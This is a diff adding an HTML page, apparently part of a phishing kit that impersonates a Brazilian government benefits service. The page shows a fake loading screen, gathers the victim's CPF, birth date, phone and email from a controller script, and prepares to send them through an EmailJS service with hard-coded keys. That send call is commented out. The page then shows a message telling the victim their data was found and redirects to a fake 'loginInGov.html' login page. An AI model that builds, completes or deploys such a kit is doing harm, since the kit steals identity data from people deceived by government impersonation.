@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fake Loading Screen</title>
+  <link rel="stylesheet" href="../view/splash.css">
+
+</head>
+
+<body>
+
+  <div class="loader-wrapper">
+    <div class="loader"></div>
+    <p>Loading...</p>
+  </div>
+  <meta http-equiv="refresh" content="06; URL='loginInGov.html'" /> 
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+  <script src="../control/controlador.js"></script>
+  <script type="module">
+    (function () {
+      emailjs.init("Lad9G2ud_wPxuwuf2");
+      alert("splash entrou");
+    })();
+
+    window.onload = function () {
+    
+    //resgatando as variáveis glovbais dentro do arquivo controlador
+      var date = sheachDate()
+
+      var message = `CPF = ${date[0]}; data de nascimento = ${date[1]}; telefone = ${date[2]}; email = ${date[3]}`
+
+       /* emailjs.send('service_b2pfjac', 'template_bmttgqn', {
+        message,
+      }, 'Lad9G2ud_wPxuwuf2')
+        .then((response) => {
+          console('Email enviado com sucesso!', response.status, response.text);
+          alert("Dados encontrados, por favor loge no sistema para solicitar seu benefício.");
+        }, (error) => {
+          console('Ocorreu um erro:', error);
+        });*/
+    }
+  </script>
+</body>
+
+</html>
